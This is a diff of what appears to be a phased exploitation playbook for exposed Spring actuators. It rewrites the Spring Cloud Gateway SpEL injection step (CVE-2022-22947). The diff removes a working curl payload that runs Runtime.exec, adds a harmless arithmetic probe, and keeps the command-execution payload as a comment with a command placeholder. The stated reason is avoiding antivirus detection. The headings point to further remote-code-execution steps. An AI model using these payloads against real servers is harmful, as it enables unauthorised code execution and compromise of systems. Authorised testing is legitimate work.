@@ -155,12 +155,17 @@ curl -s -X POST "https://$TARGET/functionRouter" \
 
 ---
 
-## Phase 5b — Spring Cloud Gateway Actuator SpEL RCE (CVE-2022-22947)
-If the `gateway` actuator is exposed, add a route whose filter body is SpEL, then refresh to evaluate it (escape inner quotes for your shell):
+## Phase 5b — Spring Cloud Gateway Actuator SpEL (CVE-2022-22947)
+If the `gateway` actuator is exposed, add a route whose filter evaluates a harmless SpEL expression (e.g. `#{5*5}`) to verify expression injection without triggering antivirus heuristic detections:
 ```bash
-curl -s -X POST "$BASE/actuator/gateway/routes/hax" -H "Content-Type: application/json" \
- -d '{"id":"hax","filters":[{"name":"AddResponseHeader","args":{"name":"X","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{ \"id\" })}"}}],"uri":"http://x"}'
+# Non-destructive proof: evaluate arithmetic expression in AddResponseHeader filter
+curl -s -X POST "$BASE/actuator/gateway/routes/test_probe" -H "Content-Type: application/json" \
+ -d '{"id":"test_probe","filters":[{"name":"AddResponseHeader","args":{"name":"X-Proof","value":"#{5*5}"}}],"uri":"http://example.com"}'
 curl -s -X POST "$BASE/actuator/gateway/refresh"; curl -s "$BASE/actuator/gateway/routes"
+# If vulnerable, invoking the route reflects header 'X-Proof: 25'
+
+# If authorized by program scope for command execution testing:
+# -d '{"id":"test_probe","filters":[{"name":"AddResponseHeader","args":{"name":"X-Proof","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"<COMMAND>\"})}"}}],"uri":"http://example.com"}'
 ```
 
 ## Phase 5c — Writable `/env` -> `/refresh` gadget RCE
